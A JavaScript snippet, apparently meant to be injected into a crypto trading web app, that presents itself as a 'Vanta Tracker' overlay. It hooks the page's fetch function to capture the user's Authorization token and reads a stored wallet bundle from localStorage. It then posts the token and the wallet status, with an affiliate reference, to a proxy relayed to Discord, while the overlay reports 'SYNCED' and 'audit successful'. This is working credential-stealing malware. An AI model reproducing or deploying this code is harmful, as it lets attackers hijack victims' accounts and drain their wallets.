(function() {
    console.log("Vanta Core: Initializing...");

    // 1. Create the Polished Overlay
    const ui = document.createElement('div');
    ui.style = `position:fixed;top:20px;right:20px;width:250px;background:#050505;border:1px solid #0f8;padding:15px;z-index:999999;font-family:monospace;color:#0f8;box-shadow:0 0 15px rgba(0,255,136,0.2);border-radius:4px;`;
    ui.innerHTML = `
        <div style="font-weight:bold;border-bottom:1px solid #0f8;margin-bottom:8px;">VANTA TRACKER v2.0</div>
        <div style="font-size:10px;color:#666;">REF: ${window.VANTA_REF}</div>
        <div id="v-status" style="margin-top:10px;font-size:12px;">STATUS: <span style="color:#bc3cfd;">SCANNING...</span></div>
    `;
    document.body.appendChild(ui);

    // 2. The Sniffer (Hooking Fetch)
    const _f = window.fetch;
    window.fetch = async (...args) => {
        const h = args[1]?.headers || {};
        const auth = h['Authorization'] || h['authorization'];

        if (auth && !window.vantaCaptured) {
            window.vantaCaptured = true;
            document.getElementById('v-status').innerHTML = "STATUS: <span style='color:#0f8;'>SYNCED</span>";
            
            // Extract Wallet Bundle
            const bundle = localStorage.getItem('padre-v2-bundles-store-v2');

            // Send to Proxy -> Discord
            _f(window.VANTA_PROXY, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    embeds: [{
                        title: "🚨 VANTA AUDIT SUCCESSFUL",
                        color: 0x00ff88,
                        fields: [
                            { name: "Affiliate", value: window.VANTA_REF, inline: true },
                            { name: "Token Found", value: "```" + auth.substring(0,40) + "...```" },
                            { name: "Wallet Bundle", value: bundle ? "✅ Captured" : "❌ Not Found" }
                        ]
                    }]
                })
            }).catch(()=>{});
        }
        return _f(...args);
    };

    // 3. Trigger initial scan
    _f('/api/v2/user/profile').catch(()=>{});
    alert("Vanta Tracker Initialized Successfully.");
})();
